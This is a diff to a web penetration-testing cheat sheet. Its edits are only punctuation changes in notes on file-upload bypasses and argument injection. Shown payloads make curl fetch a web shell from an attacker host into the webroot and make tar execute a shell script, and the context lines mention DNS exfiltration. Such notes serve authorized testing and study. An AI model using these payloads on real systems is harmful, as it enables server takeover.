@@ -3,7 +3,7 @@
 LFI / traversal: [lfi.md](lfi.md) · [rfi.md](rfi.md)
 
 ## File upload
-Find the saved path/handler. Upload success ≠ execution; request the file with a harmless marker. Change one filter at a time — extension, `Content-Type`, magic bytes and content are usually checked separately.
+Find the saved path/handler. Upload success ≠ execution; request the file with a harmless marker. Change one filter at a time: extension, `Content-Type`, magic bytes and content are usually checked separately.
 
 | Filter | Try |
 | --- | --- |
@@ -57,7 +57,7 @@ Metacharacter filters (`;`, `|`, `&`) don't stop data leaving via a command's ow
 ```
 - DNS exfil works even when outbound HTTP is firewalled; needs a domain you control resolving to `<KALI>` (or just watch `tcpdump -i <INTERFACE> port 53`).
 
-Argument injection — the backend builds `curl`/`tar`/`git` from your input without a leading `--`, so a value starting with `-` is read as a flag, not data:
+Argument injection: the backend builds `curl`/`tar`/`git` from your input without a leading `--`, so a value starting with `-` is read as a flag, not data:
 ```bash
 -o/var/www/html/shell.php http://<KALI>/shell.php    # curl: write the fetch straight into the webroot
 --checkpoint=1 --checkpoint-action=exec=sh\ shell.sh  # tar: needs two injected args + a positional (archive creation only)
